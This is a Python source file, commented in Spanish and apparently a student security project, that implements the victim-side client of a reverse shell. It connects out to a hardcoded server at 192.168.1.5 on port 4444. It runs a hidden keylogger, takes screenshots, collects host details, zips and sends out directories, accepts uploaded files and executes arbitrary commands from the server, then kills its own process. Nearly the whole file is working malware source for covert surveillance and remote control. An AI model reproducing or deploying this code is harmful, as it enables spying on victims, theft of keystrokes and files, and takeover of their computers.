""" 
PROYECTO SEGURIDAD INFORMATICA

REVERSE SHELL PYTHON
CLIENTE (VICTIMA)

"""
# se importan las librerias a utilizar
import socket, subprocess, os, sys, platform, time, threading
from zipfile import ZipFile
from mss import mss
from pynput.keyboard import Key, Listener, Controller 

class Cliente: # creamos la clases para que nos permita empaquetar datos y funcionalidades en nuestro exploit
    def __init__(self, server_ip, port, buffer_size, client_ip): # definimos nuestro constructor que nos permitira iniciar los atributos de la clase
        self.SERVER_IP = server_ip # definimos el puntero para la ip
        self.PORT = port # definimos el puntero para el puerto a utilizar
        self.BUFFER_SIZE = buffer_size # Para controlar  el buffer de lectura, para evitar muchas llamadas de lecturas
        self.CLIENT_IP = client_ip # definimos el puntero para la ip del cliente

        self.screenshot_counter = 0 # definimos el puntero para el contador del capture
        self.keyLogger = True # definimos el puntero para el keylogger valor verdadero para su ejecucion

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # definimos el puntero para la conexion del cliente para la interaccion de las maquinas

    def connectToServer(self): #funcion conexion al servidor
        self.client.connect((self.SERVER_IP, self.PORT))

    # actualizar el tamaño del búfer
    def updateBuffer(self, size): # se define la funcion actualizar Buffer
        buff = ""
        # condicion para actualizar el tamaño del buffer
        for counter in range(0, len(size)): 
            # El isdigit()método devuelve True si todos los caracteres son dígitos; de lo contrario, False.
            if size[counter].isdigit():
                buff += size[counter] # suma a la varible del lado izquierdo el valor del lado derecho

        return int(buff)

    # para cuando son archivos grandes que el buffer
    def saveBigFile(self, size, buff): # funcion para los archivos mas grandes que el buffer
        full = b''
        while True:
            if sys.getsizeof(full) >= size: #si lo bytes ocupados por el objeto en memoria es mayor o igual que el buffer de memoria sale del ciclo
                break # detiene

            recvfile = self.client.recv(buff) # almacena los bytes del ojeto en la variable

            full += recvfile # suma a la varible del lado izquierdo el valor del lado derecho

        return full # retorna los bytes del archivos 

    def sendHostInfo(self):
        """ Extraer información del host(victima) """

        host = sys.platform # funcionalidad de la libreria que permite extraer infomacion de la maquina
        self.client.send(host.encode("utf-8")) # codifica la extracion de la informacion

        cpu = platform.processor() # extraer informacion de la cpu, procesador
        system = platform.system() # extraer la informacion nombre del sistema
        machine = platform.machine() # extraer informacion del tipo de hardware
        version = platform.version() # extraer informacion de la version del sistema
        release = platform.release() # extraer informacion del número de versión del sistema operativo
        nombreMaquina = platform.node() # extrae Devuelve el nombre de la red de la computadora

        with open('./logs/info.txt', 'w+') as f: # damos acceso al archivo abriendolo en la ruta
            # dentro del archivo info.txt se imprime la informacion
            f.writelines(["CPU: " + cpu + '\n', "Sistema: " + system + '\n', "Maquina: " + machine + '\n', "Version: " + version + '\n', "Release: " + release + '\n', "Nombre Maquina: " + nombreMaquina + '\n'])

        with open('./logs/info.txt', 'rb+') as f:
            self.client.send(f.read()) # envian la informacion

        os.remove('./logs/info.txt')

    def screenshot(self):
        sct = mss()
        sct.shot(output = './logs/screen{}.png'.format(self.screenshot_counter)) # toma captura de pantalla

        picsize = os.path.getsize('./logs/screen{}.png'.format(self.screenshot_counter)) # se captura el tamaño del archivo.png
        size = str(picsize) # en la varibale size se convierte el tamaño del capture en una cadena de caracteres
        self.client.send(size.encode("utf-8")) # se codifica esa cadena de caracter y se envia
        time.sleep(0.1) # dormir 0.1 segundo para evitar la congestión de datos

        screen = open('./logs/screen{}.png'.format(self.screenshot_counter), 'rb') # abre el archivo png en modo de lectura binaria
        tosend = screen.read() # se lee ese archivo para poder enviarlo
        self.client.send(tosend) # envia el archivo actual

        screen.close() # cierra el screen
        os.remove('./logs/screen{}.png'.format(self.screenshot_counter)) # eliminar archivo de la maquina
        self.screenshot_counter += 1 # suma a la varible del lado izquierdo el valor del lado derecho

    def receiveFile(self): #  se define la funcion de recibir archivo
        # Nombre del recivido
        recvname = self.client.recv(self.BUFFER_SIZE) # se captura el tamaño de bytes
        name = recvname.decode("utf-8") # se decodifica el archivp

        # tamaño de recepcion
        recvsize = self.client.recv(self.BUFFER_SIZE)
        size = recvsize.decode("utf-8") # se decodifica el tamaño del archivo del buffer

        if int(size) <= self.BUFFER_SIZE: #condicion para el tamaño del archivo menor igual con el buffer de memoria
            recvfile = self.client.recv(self.BUFFER_SIZE) #se captura el tamaño de bytes del archivo 
            with open(f'./logs/{name}', 'wb+') as f: # entra a la ruta y guarda el archivo
                f.write(recvfile)
        else:
            # actualizando el buffer
            buff = self.updateBuffer(size)

            # archivo recibido
            fullfile = self.saveBigFile(int(size), buff) # se recibe el archivo en la variable

            # guardando el archivo
            with open(f'./logs/{name}', 'wb+') as f: # entra a la ruta y guarda el archivo
                f.write(fullfile)

    def sendFile(self): # funcion enviar archivo
        path = self.client.recv(self.BUFFER_SIZE).decode("utf-8") # se captura el tamaño de bytes y se decodifica

        filelist = os.listdir(path) #devuelve una lista que contiene los nombres de las entradas en el directorio dado por la ruta
        self.client.send("OK".encode("utf-8")) # envia codificado

        # crea el archivo .zip
        archname = './logs/files.zip' # en la variable archname se guarda la ruta nombre del archivo
        archive = ZipFile(archname, 'w') # escribe el contenido sobre el directorio

        for file in filelist: # condicion para la creacion del archivo 
            archive.write(path + '/' + file) #ruta / archivo, si no proporcionamos arcname, el archivo incluirá rutas completas

        archive.close() # cierra el archivo

        # envia el tamaño 
        arcsize = os.path.getsize(archname) # captura el tamaño del archivo
        self.client.send(str(arcsize).encode("utf-8")) # convierte en cadena caracteres el tamaño y lo envia codificado
        time.sleep(0.1) # dormir 0.1 segundo para evitar la congestión de datos

        # envia el archivo
        with open('./logs/files.zip', 'rb') as to_send: # entra a la ruta del archivo
            self.client.send(to_send.read()) # enviar el archivo

        os.remove(archname) # remueve la ruta del archivo ./logs/files.zip

    def stopKeyLogger(self): # funcion para detener el keylogger
        """ presione la tecla esc para detener el key logger """

        keyboard = Controller() # controlador para enviar eventos de teclado virtual al sistema
        keyboard.press(Key.esc) # presiona la tecla escape
        keyboard.release(Key.esc) # suelta la tecla escape
        self.keyLogger = False # el keylogger se convierte falso o se detiene

    def sendKeyLogs(self): # funcion para enviar  el registro del keylogger
        try:
            archname = './logs/files.zip' # se le asgina la ruta a ala varible
            archive = ZipFile(archname, 'w') # escribe el contenido sobre el directorio

            archive.write('./logs/readable.txt') # se esribe sobre el archivo readable.txt
            archive.write('./logs/keycodes.txt') # se escribe sobre el archivo keycodes.txt

            archive.close() # cierra el archivo
            self.client.send("[OK]".encode("utf-8")) # codifica la cadena de caracter
            time.sleep(0.1) # dormir 0.1 segundo para evitar la congestión de datos

            # envio de tamaño
            arcsize = os.path.getsize(archname) # captura el tamaño del archivo
            self.client.send(str(arcsize).encode("utf-8")) # convierte en cadena caracteres el tamaño y lo envia codificado

            # envio de archivo
            with open('./logs/files.zip', 'rb') as to_send: #abre y lee el archivo en modo binario
                self.client.send(to_send.read()) # envia la lectura del archivo
            os.remove(archname) # remueve la ruta del archivo ./logs/files.zip

        except:
            self.client.send("[ERROR]".encode("utf-8")) # si presenta error manda codificado la palabra error

    def reverseShell(self): # funcion reverse shell
        """ Iniciar el hilo para el Key logger """

        start = Keylogger() # variable para iniciar el keylogger
        kThread = threading.Thread(target = start.run)
        kThread.start() # iniciar los hilos para el keylogger

        while True: # condicion para el uso de los comandos
            command = self.client.recv(self.BUFFER_SIZE).decode("utf-8") # command recibe el tamaño del buffer en bytes decodificado para el uso de los comandos

            if not command: # condicion si no es un comando
                self.client.close() # cierra la conexion
                break

            if command == "#": # comando #
            	continue # ignorando el mensaje para comprobar si la conexión está activa

            elif command.lower() == "esc": # comando esc para salir 
                break
            elif command.lower() == "takescreen": # comando para tomar el capture de pantalla
                self.screenshot() # ejecuta la funcion screenshot

            elif command.lower() == "recv": # comando para subir archivo
                self.receiveFile() # ejecuta la funcion receiveFile

            elif command.lower() == "info": # comando para recibir informacion de la maquina victima
                self.sendHostInfo() # ejecuta la funcion senHostInfo

            elif command.lower() == "download": # comando de descarga de archivo
                try:
                    self.sendFile() # ejecuta la funcion senFile
                except:
                    self.client.send("*** Error, verifique la ruta y vuelva a intentarlo".encode("utf-8")) # mensaje de error si la ruta no existe
            
            elif command.lower() == "stop": # comando para detener el keylogger
                self.stopKeyLogger() # ejecuta la funcion stopKeylogger
                self.client.send("[*] KeyLogger detenido.".encode("utf-8")) # mensaje keylogger detenido

            elif command.lower() == "getlogs": # comando para enviar el registro del keylogger
                self.sendKeyLogs() # ejecuta la funcion envio de registro keylogger

            elif "cd" in command.lower(): # comando cd
                try:
                    d = command[3:].strip() # devuelve una copia de la cadena en la que se han eliminado los caracteres
                    os.chdir(d) # cambia el directorio de trabajo actual a la ruta dada
                    self.client.send("[*] Hecho".encode("utf-8")) # mensaje hecho lo envia codificado
                except:
                    self.client.send("[*] Directorio no encontrado / algo salió mal.".encode("utf-8")) # mensaje cuando no encuantra el directorio
            else:
                """ Shell  CMD"""

                obj = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
                output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")

                if output == "" or output == "\n": # espaciado para el cmd
                    self.client.send("[*] Hecho".encode("utf-8")) # mensaje Hecho
                else:
                    self.client.send(output.encode("utf-8")) 

        if self.keyLogger == True: # condicion para la ejecucion del keylogger
            self.stopKeyLogger() # ejecuta el keylogger

        self.client.close() # cierra la conexion

        try:
            os.system(f'taskkill /im clientwin.exe /F') # Mata el exploit
        except:
            pass

class Keylogger: # se crea la clase para el keylogger
    def __init__(self): # definimos nuestro constructor que nos permitira iniciar los atributos de la clase
        self.special = False

        """  definimos algunas teclas para registros más legibles """
        self.keycodes = {
            "Key.enter" : '\n',
            "Key.space" : ' ',
            "Key.shift_l" : '',
            "Key.shift_r" : '',
            "Key.tab" : "[TAB]",
            "Key.backspace" : "[BACKSPACE]",
            "Key.caps_lock" : "[CAPSLOCK]",
            "Key.ctrl" : "[CTRL]"
        }

        try:
            os.mkdir('./logs') # crea el directorio logs para guardar los registros del keylogger
        except FileExistsError:
            pass

    def hideLogs(self): # funcion para ocultar registro de teclas
        """ Funcion para Ocultar registros del registrador de teclas """
        command = "attrib +h ./logs/readable.txt" # comando
        subprocess.Popen(command, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE, shell = True)

    def onPress(self, key):
        if key == Key.esc:
            return False

        with open('./logs/readable.txt', 'a+') as log, open('./logs/keycodes.txt', 'a+') as codes: # abre el directorio agrega el contenido y si no existen los archivos los crea
            # Codigos keylogger
            codes.write(str(key) + '\n')

            # claves legibles
            for keycode in self.keycodes:
                if keycode == str(key):
                    self.special = True
                    log.write(self.keycodes[keycode])
                    break

            if self.special == False:
                log.write(str(key).replace("'", ""))

            self.special = False

    def run(self): # funcion para escuchar las pulsaciones de las teclas
        self.hideLogs()
        with Listener(on_press = self.onPress) as listener:
            listener.join() # escuchando las pulsaciones de teclas

def main(): # definimos   el main para definir la ip, puerto , buffer
    SERVER_IP = "192.168.1.5" # Ip del servidor 
    PORT = 4444 # puerto 
    BUFFER_SIZE = 2048 # tamaño del buffer de memoria

    try:
        os.mkdir('./logs') # se crea el directorio logs
    except FileExistsError:
        pass

    try:
        """ Creando archivos antes de comenzar todo """

        l1 = open("./logs/keycodes.txt", "w+") # se crea el key codes.txt
        l1.close()

        l2 = open("./logs/readable.txt", "w+") # se crea reable.txt
        l2.close()
    except:
        pass

    CLIENT = socket.gethostname() # le asignamos el socket a la variable
    CLIENT_IP = socket.gethostbyname(CLIENT) # le asignamos el socket para la ip del cliente


    client = Cliente(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)

    client.connectToServer() # conexion con el servidor
    client.reverseShell() # ejecución del reverseShell


if __name__ == "__main__":
    main()

